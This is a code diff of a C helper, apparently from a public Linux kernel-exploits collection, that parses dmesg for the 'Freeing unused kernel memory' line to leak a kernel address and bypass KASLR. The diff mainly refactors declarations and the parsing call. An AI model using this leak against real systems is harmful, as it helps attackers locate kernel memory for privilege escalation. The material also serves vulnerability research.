@@ -7,18 +7,19 @@
 // x86_64:
 // [    0.872873] Freeing unused kernel memory: 1476K (ffffffff81f41000 - ffffffff820b2000)
 //
-// Requires:
-// - kernel.dmesg_restrict = 0 (Default on Ubuntu systems);
-//   or CAP_SYSLOG capabilities.
-//
 // free_reserved_area() leak was removed in kernel v4.10-rc1 on 2016-10-26:
 // https://github.com/torvalds/linux/commit/adb1fe9ae2ee6ef6bc10f3d5a588020e7664dfa7
 //
 // Mostly taken from original code by xairy:
 // https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
 //
+// Requires:
+// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
+//
 // References:
 // https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
+// ---
+// <bcoles@gmail.com>
 
 #define _GNU_SOURCE
 #include <stdint.h>
@@ -55,8 +56,12 @@ int mmap_syslog(char **buffer, int *size) {
 
 unsigned long get_kernel_addr_free_reserved_area_dmesg() {
   char *syslog;
+  char *endptr;
+  char *substr;
+  char *line_buf;
+  char *addr_buf;
+  const char *needle = "Freeing unused kernel memory";
   int size;
-  const int addr_len = sizeof(long*) * 2;
   unsigned long addr = 0;
 
   printf("[.] checking dmesg for free_reserved_area() info ...\n");
@@ -64,21 +69,19 @@ unsigned long get_kernel_addr_free_reserved_area_dmesg() {
   if (mmap_syslog(&syslog, &size))
     return 0;
 
-  const char *needle1 = "Freeing unused kernel memory";
-  char *substr = (char *)memmem(&syslog[0], size, needle1, strlen(needle1));
+  substr = (char *)memmem(&syslog[0], size, needle, strlen(needle));
   if (substr == NULL)
     return 0;
 
-  char *line_buf = strtok(substr, "\n");
+  line_buf = strtok(substr, "\n");
   if (line_buf == NULL)
     return 0;
 
-  char *addr_buf = strstr(line_buf, "(");
+  addr_buf = strstr(line_buf, "(");
   if (addr_buf == NULL)
     return 0;
 
-  char *endptr = &addr_buf[addr_len];
-  addr = strtoul(&addr_buf[1], &endptr, 16);
+  addr = strtoull(&addr_buf[1], &endptr, 16);
 
   if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
     return addr;
